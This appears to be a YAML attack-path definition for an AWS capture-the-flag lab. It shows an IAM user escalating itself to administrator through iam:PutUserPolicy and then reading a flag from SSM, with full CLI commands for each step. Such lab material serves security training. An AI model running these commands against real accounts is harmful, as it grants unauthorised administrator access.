attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-007-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PutUserPolicy permission scoped to *, which allows it to
        attach an inline policy to itself and immediately escalate to full administrator
        access without needing to touch any other principal.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-007-to-admin"

  edges:
    - from: starting-user
      to: starting-user
      label: "iam:PutUserPolicy"
      grantsAdmin: true
      description: >
        Call iam:PutUserPolicy targeting your own user to attach an inline policy
        that grants AdministratorAccess. The escalation is immediate — no approval
        or propagation delay.
      hints:
        - "Write an inline policy onto your own user with iam:PutUserPolicy granting Action '*' and Resource '*' -- user inline policy changes take effect without needing to re-issue credentials."
        - "Wait 15 seconds after writing the inline policy before verifying -- IAM changes need time to propagate."
        - "Browse to https://pathfinding.cloud/paths/iam-007 for technique details."
      commands:
        - description: "Attach an inline admin policy to the starting user (self-escalation)"
          command: >
            aws iam put-user-policy
            --user-name pl-prod-iam-007-to-admin-starting-user
            --policy-name AdminEscalation
            --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
        - description: "Verify administrator access"
          command: "aws iam list-users"
    - from: starting-user
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With effective AdministratorAccess now attached via the inline policy, read the CTF flag
        from SSM Parameter Store. The ssm:GetParameter permission is included in AdministratorAccess
        and the parameter path follows the standard /pathfinding-labs/flags/ convention.
      hints:
        - "Use the elevated credentials to read the flag from SSM Parameter Store at the path shown in the target node ARN."
      commands:
        - description: "Read the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-007-to-admin --query 'Parameter.Value' --output text"
